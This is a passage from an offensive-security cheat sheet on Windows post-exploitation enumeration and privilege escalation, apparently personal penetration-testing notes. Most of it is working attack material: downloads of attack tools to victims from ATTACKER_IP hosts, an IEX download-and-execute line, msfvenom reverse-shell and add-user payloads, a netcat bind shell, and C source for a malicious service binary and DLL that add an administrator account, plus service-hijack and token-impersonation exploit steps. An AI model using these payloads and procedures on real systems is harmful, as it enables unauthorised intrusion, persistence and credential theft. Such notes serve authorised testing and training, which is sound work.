
# 4 Windows

## 4.1 Basic Windows Post-Exploit Enumeration

There are several key pieces of information we should always obtain:

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information (all interfaces, routes, and listening/active connections)
- Installed applications
- Running processes
```

Automate your enumeration with WinPEAS, etc.:

```sh
# WinPEAS for automated Windows enumeration
wget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe

# PowerUp for Winodws privilege escalation
cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .

# PowerView for manual AD enumeration
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .

# SharpHound for automated AD enumeration
cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .

# sysinternals suite in case you need it
wget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
unzip -d sysinternals sysinternals.zip

# Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens
cp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 .
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe
wget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
unzip -d mimikatz mimikatz.zip

# Rubeus.exe for AS-REP roasting, etc.
wget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

# chisel for port redirection/tunneling
echo 'DOWNLOAD chisel!'
echo 'https://github.com/jpillora/chisel/releases'

# plink.exe for port redirection/tunneling
cp /usr/share/windows-resources/binaries/plink.exe .

# nc.exe for reverse/bind shells and port redirection
cp /usr/share/windows-resources/binaries/nc.exe .

# JAWS - invoke with: powershell -exec Bypass -File .\jaws-enum.ps1
wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
# https://github.com/GhostPack/Seatbelt
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
# for older machines
wget https://github.com/carlospolop/winPE/raw/master/binaries/accesschk-xp/accesschk-2003-xp.exe



# host the files on a Windows 10+ compatible SMB share
impacket-smbserver -smb2support -user derp -password herpderp share .

# on windows host:
\\ATTACKER_IP\share\winpeas.exe
```

Commands to run:

```powershell
# Basic System Info
systeminfo
hostname

# Who am I?
whoami /all
echo %username%

# powershell way to check Integrity Level of another process
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel

# What users/localgroups are on the machine?
net user
net localgroup
powershell -c Get-LocalUser
powershell -c Get-LocalGroup
# Interesting built-in groups:
# Administrators - can do it all
# Remote Desktop Users - can use RDP
# Remote Management Users - can use WinRM
# Backup Operators - can backup and restore all files

# Who has local admin privileges?
net localgroup Administrators
powershell -c 'Get-LocalGroupMember Administrators'

# More info about a specific user. Check if user has privileges.
net user SOMEUSER

# Network Info
ipconfig /all
route print
netstat -ano
arp -a

# Firewall
netsh firewall show state
netsh firewall show config

# Installed Software
dir /b/a:d "C:\Program files" "C:\Program Files (x86)" | sort /unique
wmic product get name,version
powershell -c "Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version"
powershell -c "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | select displayname, DisplayVersion"
powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion"

# Processes
tasklist
powershell -c "get-process"
wmic process get processid,caption,executablepath,commandline,description

# Hard disks
fsutil fsinfo drives

# User environment
set

# How well patched is the system? (Hotfixes)
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Scheduled Tasks
schtasks
# more verbose list
schtasks /query /fo list /v

# Services running
# Get-CimInstance supercedes Get-WmiObject
Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike 'C:\Windows\System32\*'} | select Name,PathName
# alternatively
wmic service where "started=true and not pathname like 'C:\\Windows\\System32\\%'" get name,pathname
# old school way
tasklist /svc
net start
sc queryex type= service state= active
# List all services
powershell -c "get-service"
sc queryex type= service state= all
# names only
sc queryex type= service state= all | find /i "SERVICE_NAME:"
# Stopped services
sc queryex type= service state= inactive
# Check a service's config settings (look for unquoted service path in BINARY_PATH_NAME)
sc qc SERVICENAME

# check powershell history
powershell -c Get-History

# locate PowerShell logfile (PSReadline)
powershell -c "(Get-PSReadlineOption).HistorySavePath"
# if you get a path, use type to view the file

# check if heavier PowerShell logging is enabled
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
# if so, view powershell command history with:
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | fl
# search powershell history for secrets:
Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | Select-String -Pattern "secret" # also try 'secur' and 'passw'

# User files that may have juicy data
powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*.pst,*.ost,*.eml,*.msg,*.log,id_* -File -Recurse -ErrorAction SilentlyContinue"
# alternative
dir /a-d /s/b C:\users | findstr /ilvC:\AppData\ /C:\desktop.ini /C:\ntuser.dat /C:"\All Users\VMware" /C:"\All Users\USOShared" /C:"\All Users\Package" /C:"\All Users\Microsoft"

# Check if plaintext creds stored by Wdigest (key exists, not set to 0)
# typically only common in Windows 7 and earlier
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

# LSA Protection enabled (key set to 1)?
reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL

# Credential Guard enabled (key set to 1 or 2)
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
# win11 automatic virtualization based security enabled:
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 /v IsolatedCredentialsRootSecret
# virualization based security enabled:
reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity
# secure boot enabled:
reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v RequirePlatformSecurityFeatures

# List saved credentials
cmdkey /list
# if found, might be able to pivot with:
# wmic /node:VICTIM_IP process call create "cmd /c powershell -nop -noni -exec bypass -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://ATTACKER_IP/rsh.ps1'))\""
# or steal creds with mimikatz

# Run executable with saved creds (assuming listed in cmdkey output)
runas /savecred /user:admin C:\Users\Public\revshell.exe

# check account policy (lockout threshold)
net accounts

# If both registry keys are set with DWORD values of 1, low-priv users can install *.msi files as NT AUTHORITY\SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# to pwn: msiexec /quiet /qn /i C:\Users\Public\revshell.msi

# Does it have AutoRuns with weak permissions?
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# is UAC enabled? EnableLUA = 0x1 means enabled.
# ConsentPromptBehaviorAdmin = 0x5 is default, requires UAC bypass with MS-signed binary using autoelevate
# Bad = ConsentPrompt == 2 && SecureDesktopPrompt == 1 (UAC is set to 'Always Notify')
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v PromptOnSecureDesktop

# Can you control the registry of services?
powershell -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"
# if NT AUTHORITY\INTERACTIVE has "FullContol", can pwn with:
# see section: Windows Service Escalation - Registry

# Can you put programs in the global startup folder?
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# look for (F), full access, or (W), write access
# exploit by dropping reverse shell exe there, wait for admin to log in.

# Do we have access to the SAM database? CVE-2021-36934, https://www.kb.cert.org/vuls/id/506989
icacls %windir%\system32\config\sam

# Vulnerable to Print NightMare (CVE-2021-1675, CVE-2021-34527)?
# Check running Print Spooler service using WMIC
wmic service list brief | findstr "Spool"
powershell Get-Service "Print Spooler"
# Check Registry to ensure NoWarningNoElevationOnInstall and UpdatePromptSettings
# either don't exist or are set to 0
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\UpdatePromptSettings"
powershell gci "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

# is WSL installed?
powershell -c "Get-ChildItem​ HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{​Get-ItemProperty​ ​$_​.PSPath} | ​out-string​ -width ​4096"

# Check the powershell version
powershell $PSVersionTable.PSVersion
powershell (Get-Host).Version
powershell $host.Version

# Determine .NET version on machine (useful for running C# exploits)
dir C:\windows\microsoft.net\framework\

# Drivers
driverquery
# Kernel Drivers (for exploit?)
driverquery | findstr Kernel
# Filesystem drivers
driverquery | findstr "File System"
```


### 4.1.1 Watching for Windows Process to run

Yo can use WMI (CIM in PowerShell) to watch for a process to be executed:

```powershell
# Watches for a process with a given name to start running (or otherwise change)
# reference: https://petri.com/process-monitoring-powershellGetOwner

$poll = 1
$targetName = "backup.exe" # name of process to watch for
$logPath= "C:\Users\yoshi\Desktop\NewProcessLog.txt" # where to log hits
$query = "Select * from CIM_InstModification within $poll where TargetInstance ISA 'Win32_Process' AND TargetInstance.Name LIKE '%$targetName%'"
$action={
    # log to a file
    $date = Get-Date
    $process = $Event.SourceEventArgs.NewEvent.SourceInstance
    $owner = Invoke-CimMethod -InputObject $process -MethodName GetOwner
    $logText = ""
    $logText += "[$date] Computername = $($process.CSName)`r`n"
    $logText += "[$date] Process = $($process.Name)`r`n"
    $logText += "[$date] Owner = $($owner.Domain)\$($owner.User)`r`n"
    $logText += "[$date] Command = $($process.Commandline)`r`n"
    $logText += "[$date] PID = $($process.ProcessID)`r`n"
    $logText += "[$date] PPID = $($process.ParentProcessID)`r`n"
    $logText += "[$date] $('*' * 60)`r`n"
    $logText | Out-File -FilePath $logPath -Append -Encoding ascii
}
Register-CimIndicationEvent -Query $query -SourceIdentifier "WatchProcess" -Action $action

# to Unsubscribe:
# Get-EventSubscriber -SourceIdentifier "WatchProcess" | Unregister-Event
```


## 4.2 Windows Privilege Escalation

So many options on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).

Automated checks using SharpUp.exe or PowerUp.ps1:

```powershell
# on kali get SharpUp and/or PowerUp, serve on http
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
impacket-smbserver -smb2support -user derp -password herpderp share .

# on victim
\\ATTACKER_IP\share\SharpUp.exe audit
# or
powershell -ep bypass
. \\ATTACKER_IP\share\PowerUp.ps1
Invoke-AllChecks

# PowerUp, individually:
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Find-ProcessDLLHijack
Find-PathDLLHijack
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-ModifiableRegistryAutoRun
Get-ModifiableScheduledTaskFile
Get-UnattendedInstallFile
Get-WebConfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
```

**Background on Windows Permissions:**

Knowing how Windows identifies principals is necessary to understand access tokens. It's also critical for understanding how to move around in Active Directory.

A **Security Identifier (SID)** is how Windows identifies entities such as users or groups, formally called *principals*, that that can be authenticated. Local SIDs are generated by the _Local Security Authority (LSA)_. Domain SIDs are generated by the _Domain Controller (DC)_.

The SID format is `S-R-X-Y`:
- *S*: SIDs always start with the literal "S".
- *R*: *revision*; it is always set to 1 (SIDS still currently on 1st revision).
- *X*: identifier authority (who issued the SID); "5" is most common, representing "NT Authority", used for both local and domain users/groups.
- *Y*: sub-authorities of identifier authority. This part consists of both the domain identifier and the *Relative Identifier (RID)*. The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and "32" for built-in principals. The RID is like a unique index/ID for a user/group within that domain ID. It's almost like a `uid` or `gid` in Unix.

SIDs with RIDs under 1000 are well-known SIDs, identifying built-in users/groups. Here are some useful ones to know:

```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

SIDs starting with 1000 and incrementing up are local users/groups.

Once a user is authenticated, Windows generates an *access token* that is assigned to that user. The token itself contains various pieces of information that effectively describe the _security context_ of a given user. The security context is a set of rules or attributes that are currently in effect, including the user's SID, the SIDs of the user's groups, etc.

When a user starts a process or thread, a copy of the user's access token will be assigned to these objects. This token, called a _primary token_, specifies which permissions the process or threads have when interacting with another object. A thread can also have an _impersonation token_ assigned, which is used to provide a different security context than the process that owns the thread, allowing the thread to act on behalf of a different set of access rights.

Windows also implements what is known as *Mandatory Integrity Control*. It uses _integrity levels_ to control access to securable objects. A principal with a lower integrity level cannot write to an object with a higher level, even if the permissions would normally allow them to do so. When processes are started or objects are created, they receive the integrity level of the principal performing this operation.

From Windows Vista onward, processes run on four integrity levels:

```
- System: SYSTEM (kernel, ...)
- High: Elevated users (Administrators)
- Medium: Standard users
- Low: very restricted rights often used in sandboxed processes or for directories storing temporary data
```

How to see integrity levels:
- Processes: Process Explorer (Sysinternals)
- Current User: `whoami /groups`
- Files: `icacls`

_User Account Control (UAC)_ is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains two access tokens after a successful logon. The first token is a standard user token (or _filtered admin token_), which is used to perform all non-privileged operations. The second token is a regular administrator token. It will be used when the user wants to perform a privileged operation. To leverage the administrator token, a UAC consent prompt normally needs to be confirmed.


### 4.2.1 Check Windows File Permissions

Weak permissions can provide a privesc vector.

```powershell
# Using accesschk from SysInternals Suite
# checking file write permissions
accesschk.exe /accepteula -quvw c:\path\to\some\file.exe

# checking registry key permissions
accesschk.exe /accepteula -quvwk c:\path\to\some\file.exe

# checking service configuration change permissions
accesschk.exe /accepteula -quvwc SERVICENAME
# if you have SERVICE_CHANGE_CONFIG permissions, exploit by changing binpath
# e.g. sc config SERVICENAME binpath= "net localgroup administrators user /add"
```



### 4.2.2 Windows Service Escalation - Registry

Vulnerable when:

```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# shows NT AUTHORITY\INTERACTIVE has FullControl
```

`windows_service.c`:
```c
// compile with:
// x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

//add the payload here
int Run()
{
    system ("net user derp herpderp /add");
    system ("net localgroup administrators derp /add");
    return 0;
}

int main()
{
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "Derp";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv)
{
    ServiceStatus.dwServiceType        = SERVICE_WIN32;
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint         = 0;
    ServiceStatus.dwWaitHint           = 0;

    hStatus = RegisterServiceCtrlHandler("Derp", (LPHANDLER_FUNCTION)ControlHandler);
    Run();

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hStatus, &ServiceStatus);

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return;
}

void ControlHandler(DWORD request)
{
    switch(request)
    {
        case SERVICE_CONTROL_STOP:
			ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        default:
            break;
    }
    SetServiceStatus (hStatus,  &ServiceStatus);
    return;
}
```

Compile with `x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe`, then
upload winsvc.exe to `%temp%`.

Alternatively, create a Service EXE with msfvenom.

```sh
msfvenom -p windows/shell_reverse_tcp -f exe-service --service-name "Derp" -o winsvc.exe lport=443 lhost=tun0
```

Then install and invoke the service:

```powershell
# overwrite regsvc execution path
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d %temp%\winsvc.exe /f
# restart regsvc
sc start regsvc
```


### 4.2.3 Windows Binary Hijacking

⚠**NOTE**: Listing services requires interactive logon via RDP. You will get a "not authorized" error through WinRM or bind/reverse shell!!

This privesc vector works by overwriting the executable file for Windows Services, Scheduled Tasks, and AutoRuns. Service hijacking, Scheduled Tasks hijacking, and AutoRuns hijacking.

You can automate the search for the privesc vector with PowerUp:

```sh
# on kali, serve up PowerUp.ps1
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
sudo python -m http.server 80

# on victim
certutil -urlcache -split -f http://LISTEN_IP/PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableService # can change binpath
Get-ModifiableServiceFile # can overwrite executable file
Get-ModifiableRegistryAutoRun # can modify executable file/path
Get-ModifiableScheduledTaskFile # can modify task executable
```

To find the vulnerability manually:

First look for running services with paths outside `C:\Windows\System32`:

```powershell
# Get-CimInstance supercedes Get-WmiObject
Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike 'C:\Windows\System32\*'} | select Name,PathName
# alternatively
wmic service where "started=true and not pathname like 'C:\\Windows\\System32\\%'" get name,pathname
```

Here's how to look for Scheduled Tasks:

```powershell
$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
```

Next, check permissions of binary files:

```powershell
icacls "C:\path\to\binary.exe"
```

Common `icacls` permissions masks:

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

Look for ones that allow writing (F, M, W), especially under `Authenticated Users`.

**Exploiting the vulnerability**:

If the service binary is invoked without arguments, you can easily use `PowerUp.ps1` to exploit it:

```powershell
# create new local admin user derp:herpderp
powershell -ep bypass
. .\PowerUp.ps1
Install-ServiceBinary -User 'derp' -Password 'herpderp' -ServiceName 'SERVICENAME'
# by default, creates new local user: john with password Password123!
```

To exploit manually:

Create a malicious service binary. Here is a simple one that adds a new admin user account:

```c
// compile with:
// x86_64-w64-mingw32-gcc derp.c -o derp.exe

#include <stdlib.h>

int main ()
{
  system ("net user derp herpderp /add");
  system ("net localgroup administrators derp /add");
  return 0;
}
```

Alternatively, create the windows service binary with `msfvenom`.

```sh
# add user - msfvenom
msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1!

# run arbitrary command - msfvenom
msfvenom -p windows/exec -f exe -o derp.exe lport=443 cmd="C:\Windows\Temp\nc.exe -L -p 6969 -e cmd.exe" lhost=tun0
```

Once compiled, transfer over to victim machine and replace the vulnerable service binary with your own.

```powershell
iwr -uri http://192.168.119.3/derp.exe -Outfile derp.exe
move C:\path\to\vulnerable\service.exe service.exe.bak
move .\derp.exe C:\path\to\vulnerable\service.exe
```

Try to restart the service:

```powershell
net stop SERVICENAME
net start SERVICENAME
```

If you get "Access Denied" error, you may be able to restart service by rebooting machine:

```powershell
# check the StartMode
# if it's "Auto", you can restart the service by rebooting
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'SERVICENAME'}

# check that you can reboot
# look for "SeShutdownPrivilege" being present (doesn't matter if it says "Disabled")
whoami /priv

# restart the machine
shutdown /r /t 0
```


### 4.2.4 Windows DLL Hijacking

References:
- [HackTricks DLL Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)

There are multiple ways to hijack a DLL. One method is to overwrite an existing DLL that you have write permissions for, but this can often cause the program to crash because it's looking for exports that the malicious DLL doesn't provide.

A better way is to abuse the DLL search order (sometimes called *Search Order Hijacking*). Here is the default search order in Windows with **SafeDllSearchMode** enabled (when it's disabled, the current working directory jumps up to slot #2):

1. The directory from which the application loaded.
2. The system directory. (`C:\Windows\System32`)
3. The 16-bit system directory. (`C:\Windows\System`)
4. The Windows directory.  (`C:\Windows`)
5. The current directory.
6. The directories that are listed in the PATH environment variable.

Note: if you can edit the SYSTEM PATH variable, you can potentially use that to perform a DLL search order hijack. You can check if you have Write permissions on any directories in the PATH with (WinPEAS does this automatically):

```
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

You can check if SafeDLLSearchMode is enabled in the registry:

```powershell
# Enabled = 1, Disabled = 0
reg query 'HKLM\System\CurrentControlSet\Control\Session Manager' /v SafeDllSearchMode
# or
Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Session Manager' -Name SafeDllSearchMode
```


**Finding Missing DLLs**:

Automated way with PowerUp.ps1:

```powershell
iwr http://LISTEN_IP/PowerUp.ps1 -outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Find-ProcessDLLHijack
Find-PathDLLHijack
```

To manually see if a binary is missing DLLs, you can use Process Monitor (procmon, from [Sysinternals](https://download.sysinternals.com/files/SysinternalsSuite.zip)). This requires admin privileges, so you may need to copy over the service binary and DLLs to your own Windows machine to test. It's also possible to perform static binary reverse engineering, but that's a pain.

```sh
wget https://download.sysinternals.com/files/SysinternalsSuite.zip
unzip -d sysinternals SysinternalsSuite.zip
impacket-smbserver -smb2support -user derp -password herpderp share .
# connect with: net use \\ATTACKER_IP herpderp /user:derp
```

Add Filters to procmon to only see missing DLL events. This happens when `CreateFile()` results in a `NAME NOT FOUND` error while trying to open a DLL. 

| Column       | Relation  | Value           | Action  |
| ------------ | --------- | --------------- | ------- |
| Path         | ends with | .dll            | Include |
| Result       | contains  | not found       | Include |
| Operation    | is        | CreateFile      | Include |
| Process Name | is        | `TARGETSVC.exe` | Include |

Restart the service/process and check procmon to see if it fails to load any DLLs:

```powershell
Restart-Service VICTIMSERVICE
```

If you find DLLs that fail to open, and the search order includes a path that you can write to, you're in luck.

**Exploiting:**

Create a malicious DLL. Here is a simple example that adds a local admin user:

```c
// compile with:
// x86_64-w64-mingw32-gcc derp.c -shared -o derp.dll

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
  switch ( ul_reason_for_call )
  {
    case DLL_PROCESS_ATTACH: // A process is loading the DLL.
      system ("net user derp herpderp /add");
      system ("net localgroup administrators derp /add");
      break;
    case DLL_THREAD_ATTACH: // A process is creating a new thread.
      break;
    case DLL_THREAD_DETACH: // A thread exits normally.
      break;
    case DLL_PROCESS_DETACH: // A process unloads the DLL.
      break;
  }
  return TRUE;
}
```

Alternatively, you can use `msfvenom` to create a malicious DLL:

```sh
# add user - msfvenom
msfvenom -p windows/adduser -f dll -o derp.dll USER=derp PASS=Herpderp1!
```

> ⚠ **NOTE:** Make sure you match the DLL to the ***appropriate architecture*** of the target binary (32-bit vs 64-bit)!!! If you don't, your exploit will fail!

Put the new DLL in the search path of the service executable on the victim host, then restart the service.

```powershell
# copy the dll to the correct location with the correct name
iwr -uri http://LISTEN_IP/derp.dll -Outfile C:\path\to\REALNAME.dll
# or
certutil -urlcache -split -f http://LISTEN_IP/derp.dll C:\path\to\REALNAME.dll

# restart service
Restart-Service VICTIMSERVICE
```


### 4.2.5 Unquoted Windows Service Paths

If a Windows service's path contains spaces and isn't quoted in the service entry, you might be able to hijack its execution by inserting a binary that gets executed in its place. This requires write permissions to the **parent directory** of whichever path component contains a space, and you drop and EXE in that directory named `word-before-space.exe`. For example, if the path starts with `C:\Program Files\...`, then you'd need write permissions to `C:\`, and would drop an EXE named `Program.exe`.

This is how Windows tries to resolve the unquoted path `C:\Program Files\My Program\My service\service.exe`:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

**Finding Unquoted Service Paths**:

```powershell
# lists all unquoted service paths with a space in them
Get-CimInstance -ClassName win32_service | Where-Object {$_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notlike '"*' -and $_.PathName -like '* *.exe*'} | select Name,PathName
# alternatively, for cmd only
wmic service where "pathname like '% %.exe%'" get name,pathname |  findstr /ipv "C:\\Windows\\" | findstr /ipv """


# alternatively, use PowerUp.ps1
iwr http://LISTEN_IP/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```

For paths you find, check permissions of each appropriate directory with `icacls DIRECTORY`. Look for write permissions (F, M, W), especially for `Authenticated Users`.

**Exploiting:**

Once you find your candidate, generate a payload binary with `msfvenom` or whatever:

```sh
# add user - msfvenom
msfvenom -p windows/adduser -f exe -o derp.exe USER=derp PASS=Herpderp1!

# host on http
sudo python -m http.server 80
```

Then drop it in the appropriate directory with the appropriate name on the victim:

```powershell
# grab file and put it in right spot with right name
iwr http://VICTIM_IP/derp.exe -outfile C:\path\to\file.exe

# restart the service
restart-service "SERVICENAME"
```

If you are using PowerUp, you can use that to exploit the vulnerability:

```powershell
powershell -e bypass
. .\PowerUp.ps1
# change path as appropriate
Write-ServiceBinary -Name 'SERVICENAME' -UserName 'derp' -Password 'herpderp' -Path "C:\Program Files\Enterprise Apps\Current.exe"

# still restart service
restart-service "SERVICENAME"
```


### 4.2.6 Windows Token Impersonation

You can use token impersonation to elevate privileges.

These require the `SeImpersonatePrivilege` or `SeAssignprimaryTokenPrivilege` to be enabled. This is the case when you have a shell running as `NT AUTHORITY\LOCAL SERVICE`, as well as `Local System`, `Network Service`, and `Application Pool Identity` (common when access was from exploiting IIS or other Windows services).

#### 4.2.6.1 Windows Token Impersonation with GodPotato

GodPotato works with a wide range of Windows versions (Windows Server 2012 - Windows Server 2022; Windows 8 - Windows 11). It's also very easy to use as a way to run a command as SYSTEM as long as your current user has the `SeImpersonatePrivilege`.

```sh
# On windows host, first check .NET version
dir C:\windows\microsoft.net\framework\

# On Kali, download appropriate binary
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe

# also generate a reverse shell
msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0

# start a HTTP server to host the binaries
python -m http.server 80

# start reverse shell listener
nc -lvnp 443

# On windows, download and execute GodPotato with reverse shell
cd C:\Users\Public
iwr -uri http://LISTEN_IP/derp.exe -Outfile derp.exe
iwr -uri http://LISTEN_IP/GodPotato-NET4.exe -Outfile GodPotato.exe
.\GodPotato.exe -cmd "C:\users\public\derp.exe"
```



#### 4.2.6.2 Windows Token Impersonation with PrintSpoofer

First grab the binary and host it on HTTP.

```sh
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe
sudo python3 -m http.server 80
```

Then throw the exploit on the Windows victim.

```powershell
iwr -uri http://LISTEN_IP/PrintSpoofer64.exe -Outfile PrintSpoofer.exe

# throw the exploit
.\PrintSpoofer.exe -i -c "powershell"
```

#### 4.2.6.3 Windows Token Impersonation with RoguePotato

NOTE: Alternatives to RoguePotato include: _RottenPotato_, _SweetPotato_, _JuicyPotato_, and [_JuicyPotatoNG_](https://github.com/antonioCoco/JuicyPotatoNG).

```sh
# on kali box, grab binary
wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
unzip RoguePotato.zip

# set up socat redirector for roguepotato to bounce off of
sudo socat -dd tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
